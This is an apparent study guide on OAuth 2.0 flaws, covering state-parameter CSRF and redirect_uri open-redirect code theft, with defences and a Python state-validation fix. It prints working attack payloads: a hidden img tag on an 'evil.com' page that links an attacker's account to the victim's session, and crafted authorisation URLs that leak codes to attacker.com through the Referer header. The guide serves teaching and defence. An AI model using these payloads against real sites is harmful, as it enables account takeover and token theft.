# Theory

OAuth 2.0 is an authorisation framework that allows a third-party application to obtain limited access to a user's account on another service without exposing the user's credentials. OAuth authentication vulnerabilities arise when the implementation is misconfigured — particularly around the `state` parameter, `redirect_uri` validation, and token handling — allowing attackers to steal authorisation codes or hijack OAuth flows.

## Key Aspects

	Delegates authorisation to a trusted identity provider (Google, GitHub, etc.)
	Misconfigurations allow authorisation code theft and account takeover
	Types: OAuth State Parameter Bypass (CSRF) & Open Redirect via redirect_uri

# Scenarios
## OAuth State Parameter Bypass (CSRF on OAuth)

A web application uses OAuth 2.0 to allow users to log in with their Google account.

The OAuth flow:
1. App redirects user to Google's authorisation server with a `state` parameter.
2. User authenticates with Google.
3. Google redirects back to `https://shop.test/callback?code=<auth_code>&state=<state>`.
4. App exchanges the `code` for an access token.

The application **does not validate the `state` parameter** on the callback — it processes any `code` returned to `/callback`.

### a. Predict the Normal OAuth Flow

```
1. User clicks "Login with Google"
2. App generates state = random_token, stores in session
3. Browser redirects to:
   https://accounts.google.com/o/oauth2/auth
   ?client_id=<client_id>
   &redirect_uri=https://shop.test/callback
   &response_type=code
   &scope=openid+email
   &state=random_token

4. User logs in at Google
5. Google redirects to: https://shop.test/callback?code=AUTH_CODE&state=random_token
6. App verifies state matches session → exchanges code for token → logs user in
```

The `state` parameter acts as a CSRF token for the OAuth flow — it binds the callback to the original session.

### b. Craft an OAuth CSRF attack (State Bypass)

Since the app does not validate `state`, the attacker can force a victim to complete the attacker's OAuth flow:

**Step 1 — Attacker initiates their own OAuth flow:**
```
https://accounts.google.com/o/oauth2/auth
?client_id=<client_id>
&redirect_uri=https://shop.test/callback
&response_type=code
&scope=openid+email
&state=attacker_state
```

**Step 2 — Attacker intercepts the callback URL before following the redirect:**
```
https://shop.test/callback?code=ATTACKER_AUTH_CODE&state=attacker_state
```

The attacker **does not follow this URL** — they capture it instead.

**Step 3 — Attacker tricks the victim into visiting the captured callback URL:**
```html
<img src="https://shop.test/callback?code=ATTACKER_AUTH_CODE&state=attacker_state" style="display:none">
```

- Victim's browser sends the request to `/callback` while authenticated on `shop.test`.
- The app exchanges the attacker's `ATTACKER_AUTH_CODE` for a token and links the attacker's Google account to the victim's session.
- **The attacker can now log into `shop.test` using their own Google account and access the victim's account.**

### c. Conditions required for OAuth State Bypass

1. The application must **not validate the `state` parameter** on the callback (or generate a static/predictable state).
2. The OAuth flow must use the **Authorization Code grant type** (not implicit flow).
3. The application must **link the OAuth identity to the current session** upon receiving a valid code.
4. The victim must be **authenticated on the target application** and **lured to the attacker's crafted callback URL**.
5. The attacker must be able to **obtain a valid authorisation code** for their own account.

> The `state` parameter in OAuth serves the same purpose as a CSRF token in form submissions. Skipping its validation opens the flow to CSRF-style hijacking.

### d. Craft a payload to silently link attacker's account to victim's profile

```html
<!-- Attacker's page on evil.com -->
<html>
  <body>
    <!-- Auto-loads the callback with attacker's auth code in victim's browser session -->
    <img src="https://shop.test/callback?code=ATTACKER_CODE&state=any" style="display:none">
    <p>Loading your dashboard...</p>
  </body>
</html>
```

- Victim visits `evil.com` while logged into `shop.test`.
- The image request triggers the OAuth callback in the victim's session.
- The app associates the attacker's Google account with the victim's `shop.test` account.
- Attacker logs into `shop.test` via "Login with Google" → gains access to victim's account.

### e. State the defences against OAuth CSRF and explain how they break the attack

| Defence | How it works | How it breaks the attack |
|---|---|---|
| **Validate the `state` parameter** | App generates a random `state`, stores it in the session, and verifies it matches on callback | Attacker's crafted callback carries a state that does not match the victim's session → request rejected |
| **Use `nonce` in OIDC** | OpenID Connect `nonce` parameter is embedded in the ID token and validated client-side | Replayed auth codes with a different nonce are rejected |
| **Short-lived authorisation codes** | Auth codes expire within seconds (RFC 6749 recommends < 10 minutes) | Attacker's code expires before the victim can be tricked into using it |
| **Bind code to `redirect_uri`** | Auth server ensures the code can only be redeemed by the same `redirect_uri` it was issued for | Code cannot be used on a different URI |

---

## Open Redirect via redirect_uri

The same application's OAuth implementation uses a `redirect_uri` to specify where Google should send the auth code. The app whitelists only `https://shop.test/callback`.

However, the **authorisation server validates only the domain**, not the full path — any path on `shop.test` is accepted.

### a. Predict the Normal Redirect Behaviour

```
App → Google: redirect_uri=https://shop.test/callback
Google → User browser: GET https://shop.test/callback?code=AUTH_CODE&state=...
App: receives code, exchanges for token
```

The full path `https://shop.test/callback` must match exactly in a secure implementation.

### b. Craft an Open Redirect via redirect_uri

The app has an open redirect at `https://shop.test/redirect?url=<destination>`:

```
https://accounts.google.com/o/oauth2/auth
?client_id=<client_id>
&redirect_uri=https://shop.test/redirect?url=https://attacker.com
&response_type=code
&scope=openid+email
&state=xyz
```

- Google validates the domain `shop.test` → accepted (domain-only validation).
- Google sends `code` to `https://shop.test/redirect?url=https://attacker.com&code=AUTH_CODE&state=xyz`.
- `shop.test/redirect` immediately redirects the browser to `https://attacker.com?code=AUTH_CODE&state=xyz`.
- **The auth code appears in the Referer header and server logs at `attacker.com`** — attacker steals it.

Attacker exchanges the stolen code:
```
POST https://oauth.google.com/token
Body: code=AUTH_CODE&client_id=<id>&client_secret=<secret>&redirect_uri=https://shop.test/redirect?url=https://attacker.com&grant_type=authorization_code
```

→ Receives access token → calls Google API as the victim.

### c. Conditions required for Open Redirect via redirect_uri

1. The authorisation server performs **domain-only** (or prefix-only) validation of `redirect_uri` instead of exact-match.
2. The client application has an **open redirect endpoint** on the whitelisted domain (`/redirect?url=...`).
3. The attacker can **register a crafted redirect_uri** pointing to the open redirect endpoint.
4. The victim must **be lured into clicking the attacker's crafted authorisation URL** (phishing, malicious link).

### d. Craft a payload to steal the victim's authorisation code via Referer leakage

```
https://accounts.google.com/o/oauth2/auth
?client_id=<client_id>
&redirect_uri=https://shop.test/redirect?url=https://attacker.com/capture
&response_type=code
&scope=openid+email
&state=random
```

1. Victim clicks this link and authenticates with Google.
2. Google redirects to `https://shop.test/redirect?url=https://attacker.com/capture&code=AUTH_CODE`.
3. `shop.test/redirect` issues a 302 to `https://attacker.com/capture`.
4. The browser follows the redirect — `Referer: https://shop.test/redirect?url=...&code=AUTH_CODE` is sent to `attacker.com`.
5. Attacker reads the `code` from the Referer header log.

### e. State the defences against redirect_uri attacks and explain how they break the attack

| Defence | How it works | How it breaks the attack |
|---|---|---|
| **Exact-match `redirect_uri` validation** | Auth server compares the full URI (scheme + host + path + query) character-by-character | `https://shop.test/redirect?url=...` does not match the registered `https://shop.test/callback` → rejected |
| **Eliminate open redirects** | Remove or restrict all open redirect endpoints from the whitelisted domain | Even if domain-only validation is used, there is no redirect gadget to chain with |
| **`redirect_uri` registration** | Only pre-registered exact URIs are permitted — no wildcard or prefix matching | Attacker cannot register a new URI pointing to their server |
| **`state` parameter + PKCE** | PKCE (Proof Key for Code Exchange) binds the auth code to the original request session | A stolen code cannot be exchanged by the attacker because they lack the `code_verifier` |

---

# Exam-Style Questions

## Question 1 — ConnectPro

A job portal **ConnectPro** implements "Login with LinkedIn". During testing, the OAuth callback endpoint `https://connectpro.test/oauth/callback` does not verify the `state` parameter returned by LinkedIn.

### (a) Describe the attack

1. Attacker starts their own "Login with LinkedIn" flow → stops before following the redirect.
2. Captures the callback URL: `https://connectpro.test/oauth/callback?code=ATTACKER_CODE&state=any`.
3. Embeds the URL in a hidden image on an attacker-controlled page.
4. Victim (logged into ConnectPro) visits the attacker's page.
5. The callback fires in the victim's session → LinkedIn attacker account is linked to victim's ConnectPro account.
6. Attacker logs in with LinkedIn → accesses victim's ConnectPro profile, job applications, and contact info.

### (b) Recommend the fix

```python
# On initiating the OAuth flow:
import secrets
state = secrets.token_urlsafe(32)
session['oauth_state'] = state
redirect(f"https://linkedin.com/oauth/v2/authorization?...&state={state}")

# On receiving the callback:
if request.args.get('state') != session.get('oauth_state'):
    abort(400, "Invalid state parameter — possible CSRF attack")
```

- Generate a cryptographically random `state` per session.
- Validate the returned `state` strictly before processing the `code`.
- Invalidate the stored state after use (one-time use).
